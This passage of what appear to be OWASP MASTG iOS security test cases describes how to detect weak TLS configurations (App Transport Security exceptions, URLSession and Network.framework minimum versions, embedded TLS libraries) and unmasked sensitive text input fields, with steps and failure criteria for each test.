Apps can also globally disable ATS by setting [`NSAllowsArbitraryLoads`](https://developer.apple.com/documentation/bundleresources/information_property_list/nsapptransportsecurity/nsallowsarbitraryloads) to `true`. This disables ATS protections for connections made through the URL Loading System, including ATS requirements such as minimum TLS version and forward secrecy, and permits plaintext HTTP communication. It may also relax ATS-specific certificate requirements. Baseline TLS/X.509 certificate chain validation and server trust evaluation performed by the URL Loading System still apply. Per-domain entries under `NSExceptionDomains` override the global setting. For example, if `NSAllowsArbitraryLoads` is `true` but `tls-v1-2.example.com` has `NSExceptionMinimumTLSVersion = "TLSv1.2"`, that domain still requires TLS 1.2 or higher, while all other domains have ATS disabled. This includes the ability of all other domains to use plaintext HTTP.

## Steps

1. Extract the app (@MASTG-TECH-0058).
2. Locate the `Info.plist` in the app bundle.
3. Use @MASTG-TECH-0138 to convert the `Info.plist` to a readable format if necessary.
4. Examine the `NSAppTransportSecurity` dictionary for TLS policy exceptions, specifically `NSExceptionMinimumTLSVersion`, `NSExceptionRequiresForwardSecrecy` and `NSAllowsArbitraryLoads`.

## Observation

The output should contain any TLS policy exceptions configured under `NSAppTransportSecurity`, if present.

## Evaluation

The test case fails if **any** of the following conditions are met:

1. `NSAllowsArbitraryLoads` is set to `true`. This disables ATS for all connections to domains not listed in `NSExceptionDomains`. Per-domain exceptions in `NSExceptionDomains` still apply to their respective domains, but all other domains have no ATS restrictions.
2. Any domain, IP address, or IP address range sets `NSExceptionMinimumTLSVersion` to `TLSv1.0` or `TLSv1.1`.
3. Any domain, IP address, or IP address range sets `NSExceptionRequiresForwardSecrecy` to `false`, `NO`, or `0`.

!!! note "App Store Submission Context"
    Apple may require [justification](https://developer.apple.com/documentation/security/preventing-insecure-network-connections#Provide-Justification-for-Exceptions) for ATS exceptions during App Store submission. If available, record that evidence in the report as contextual information only.
## URLSession TLS Protocol Configuration

## Overview

`URLSessionConfiguration` allows apps to customize TLS behavior for individual `URLSession` instances. The [`tlsMinimumSupportedProtocolVersion`](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/tlsminimumsupportedprotocolversion) property (or the deprecated [`tlsMinimumSupportedProtocol`](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/tlsminimumsupportedprotocol)) controls the minimum TLS version for a session.

Setting this property to `.TLSv10` or `.TLSv11` is a bad practice and should be flagged, even though ATS still applies to the URL Loading System and may block the connection at runtime unless a matching `Info.plist` exception is also present. Unlike `Network.framework`, `URLSession` does not bypass ATS.

Note that `tlsMinimumSupportedProtocol` is deprecated in favor of `tlsMinimumSupportedProtocolVersion`. Using either to set an insecure minimum TLS version weakens the intended TLS protection for that session.

## Steps

1. Use @MASTG-TECH-0065 to reverse engineer the app.
2. Use @MASTG-TECH-0066 to look for uses of `URLSessionConfiguration` properties that set TLS protocol versions (`tlsMinimumSupportedProtocol` and `tlsMinimumSupportedProtocolVersion`).
3. Use @MASTG-TECH-0076 to analyze the relevant code paths and determine the TLS version values being set.

## Observation

The output should contain the `URLSessionConfiguration` API calls that configure TLS protocol versions, if any.

## Evaluation

The test case fails if the app sets:

- `tlsMinimumSupportedProtocolVersion` to `tls_protocol_version_TLSv10` (value `0x0301`) or `tls_protocol_version_TLSv11` (value `0x0302`), or
- `tlsMinimumSupportedProtocol` (deprecated) to a value corresponding to TLS 1.0 (`kTLSProtocol1`) or TLS 1.1 (`kTLSProtocol11`).

!!! note "Note on ATS Interaction"
    ATS may still enforce minimum TLS version requirements for connections using the URL Loading System, depending on the ATS configuration in `Info.plist`. However, if the app has also configured broad ATS exceptions (see @MASTG-TEST-0342), the effective TLS minimum may be lower than expected for those domains.
## Network.framework TLS Protocol Configuration

## Overview

The [Network framework](https://developer.apple.com/documentation/network) operates entirely outside of ATS. Apps using `NWConnection` with `NWProtocolTLS.Options` can configure TLS settings directly via the Security framework, including minimum and maximum supported TLS versions through [`sec_protocol_options_set_min_tls_protocol_version`](https://developer.apple.com/documentation/security/sec_protocol_options_set_min_tls_protocol_version(_:_:)) and [`sec_protocol_options_set_max_tls_protocol_version`](https://developer.apple.com/documentation/security/sec_protocol_options_set_max_tls_protocol_version(_:_:)).

Since ATS does not apply to Network.framework connections, any weak TLS configuration here is not mitigated by ATS. Setting a minimum TLS version below 1.2 creates the risk of connection downgrade attacks without any ATS-level safety net. Apple's documentation notes that "ATS doesn't apply to calls your app makes to lower-level networking interfaces like the `Network` framework or `CFNetwork`. In these cases, you take responsibility for ensuring the security of the connection." See [Preventing Insecure Network Connections](https://developer.apple.com/documentation/security/preventing-insecure-network-connections).

For more information on iOS network APIs and when ATS applies, see @MASTG-KNOW-0071 and @MASTG-KNOW-0073.

## Steps

1. Use @MASTG-TECH-0065 to reverse engineer the app.
2. Use @MASTG-TECH-0066 to look for uses of `sec_protocol_options_set_min_tls_protocol_version` and `sec_protocol_options_set_max_tls_protocol_version` in the app binary.
3. Use @MASTG-TECH-0076 to analyze the relevant code paths and determine the TLS version values passed to those functions.

## Observation

The output should contain any calls to TLS protocol version configuration functions in the Network.framework, if found.

## Evaluation

The test case fails if the app calls:

- `sec_protocol_options_set_min_tls_protocol_version` with a value of `tls_protocol_version_TLSv10` (`0x0301`) or `tls_protocol_version_TLSv11` (`0x0302`), or
- `sec_protocol_options_set_max_tls_protocol_version` with a value of `tls_protocol_version_TLSv10` (`0x0301`) or `tls_protocol_version_TLSv11` (`0x0302`).

Because Network.framework operates entirely outside of ATS, a connection configured this way will succeed against a server that supports the deprecated TLS version, bypassing ATS.
## Embedded or Third-party TLS Stack Configuration

## Overview

Some apps embed networking stacks that manage TLS independently from Apple's ATS-enforced URL Loading System. Examples include OpenSSL, BoringSSL, mbedTLS, curl, and gRPC. Since ATS doesn't apply to these libraries, any weak TLS configuration in them is not protected by ATS or `URLSession` settings.

Such libraries often expose their own API calls to set the minimum TLS version, maximum TLS version, cipher suite list, certificate verification mode, or custom trust store. If these settings permit TLS below 1.2, allow deprecated cipher suites, or disable certificate verification, they introduce vulnerabilities that are entirely independent of the ATS configuration.

Apple's documentation states that "ATS doesn't apply to calls your app makes to lower-level networking interfaces like the `Network` framework or `CFNetwork`. In these cases, you take responsibility for ensuring the security of the connection." (See [Preventing Insecure Network Connections](https://developer.apple.com/documentation/security/preventing-insecure-network-connections).) The same principle applies to entirely embedded TLS libraries.

## Steps

1. Use @MASTG-TECH-0082 to list the frameworks and libraries bundled in the app (under `Frameworks/` or statically linked into the binary).
2. Use @MASTG-TECH-0066 to identify embedded third-party TLS library symbols (for example, `SSL_CTX_set_min_proto_version` for OpenSSL/BoringSSL, `mbedtls_ssl_conf_min_version` for mbedTLS, or `curl_easy_setopt` for libcurl).
3. Use @MASTG-TECH-0076 to analyze the code paths where TLS configuration is applied and determine the minimum TLS version, cipher suites, and certificate verification settings in use.

## Observation

The output should contain a list of any identified third-party TLS library functions and their configuration call sites within the app binary.

## Evaluation

The test case fails if any embedded TLS library is configured to:

- Allow TLS versions below 1.2.
- Use weak or deprecated cipher suites.
- Disable certificate verification or use a custom trust store without proper validation.
## References to APIs Hiding Sensitive Data in Text Input Fields

## Overview

If the app does not mask text input fields that contain sensitive data, such data may be visible to bystanders (shoulder surfing) or captured in screenshots and screen recordings.

This test statically analyzes the app binary for references to text input APIs and checks whether the app configures input fields to mask sensitive text entries. In iOS, masking replaces typed characters with bullet characters using the following settings:

- In `UIKit`, this is done by setting [`isSecureTextEntry`](https://developer.apple.com/documentation/uikit/uitextinputtraits/issecuretextentry) to `true` on a `UITextField`.
- In `SwiftUI`, this is done by using [`SecureField`](https://developer.apple.com/documentation/swiftui/securefield) instead of `TextField`.

Example for UIKit:

```swift
let passwordField = UITextField()
passwordField.isSecureTextEntry = true
// Alternatively, toggling the property
textField.isSecureTextEntry.toggle()
```

Example for SwiftUI:

```swift
SecureField("Password", text: $password)
```

## Steps

1. Use @MASTG-TECH-0065 to reverse engineer the app.
2. Use @MASTG-TECH-0066 to look for uses of the relevant APIs.
3. Use @MASTG-TECH-0076 to analyze the relevant code paths and determine whether sensitive data is stored in the input fields.

## Observation

The output should contain a list of locations where the app:

- Creates text input fields, such as `UITextField`, `SecureField` or `TextField`.
- Explicitly configures visibility attributes that mask the inputted text.

## Evaluation

The test case fails if the app uses text input fields to input sensitive data and these input fields are not masked. This occurs when:

- `UIKit` `UITextField` used for a password, PIN, or OTP does not have [`isSecureTextEntry`](https://developer.apple.com/documentation/uikit/uitextinputtraits/issecuretextentry) set to `true`.
- `SwiftUI` `TextField` is used instead of [`SecureField`](https://developer.apple.com/documentation/swiftui/securefield) for a password, PIN, or OTP field.

!!! note
    It is not a failure if non-sensitive text input fields (for example, for a username or email address) are unmasked. Validating whether a text input field is used for sensitive data may require a review of the app's UI and business logic to determine the context in which the field is used.

!!! note
    This test may produce false negatives if the app uses custom text input controls that do not rely on standard classes such as `UITextField` or `SecureField` (for example in custom UI frameworks or game engines, or if text entry is handled through nonstandard abstractions that prevent reliable observation of input traits at rest).
## Runtime Use of APIs Hiding Sensitive Data in Text Input Fields

## Overview

This test complements @MASTG-TEST-0346. It monitors text input fields in the app at runtime to check if the app masks the text entry when the user enters sensitive data.

If the app does not mask text input fields that contain sensitive data, such data may be visible to bystanders (shoulder surfing) or captured in screenshots and screen recordings.

Ensure you exercise the app thoroughly, entering realistic sensitive data (for example, usernames, passwords, email addresses, credit card numbers, recovery codes) into each identified text input field.

## Steps

1. use @MASTG-TECH-0056 to install the app.
2. Use @MASTG-TECH-0095 to hook the relevant APIs.

## Observation

The output should contain evidences that allow associating each text entry with the corresponding input field and its protection status. At minimum it should contain:

- The input field class, such as `UITextField`, `SecureField` or `TextField`.
- The input traits relevant to visibility, for example, `isSecureTextEntry`.
- The entered values so they can be correlated with sensitive data.

## Evaluation

The test case fails if the app uses UI elements that do not allow masking text or if any text input field used containing sensitive data is found unmasked. For example, due to the following:

- A `UITextField` used for a password, PIN, or OTP does not have [`isSecureTextEntry`](https://developer.apple.com/documentation/uikit/uitextinputtraits/issecuretextentry) set to `true`.
- A SwiftUI `TextField` is used instead of [`SecureField`](https://developer.apple.com/documentation/swiftui/securefield) for a password, PIN, or OTP field.

!!! note
    It is not a failure if non-sensitive text input fields (for example, for a username or email address) are unmasked. Validating whether a text input field is used for sensitive data may require a review of the app's UI and business logic to determine the context in which the field is used.

!!! note
    This test may produce false negatives if the app uses custom text input controls that do not rely on standard classes such as `UITextField` or `SecureField` (for example in custom UI frameworks or game engines, or if text entry is handled through nonstandard abstractions that prevent reliable observation of input traits at rest).
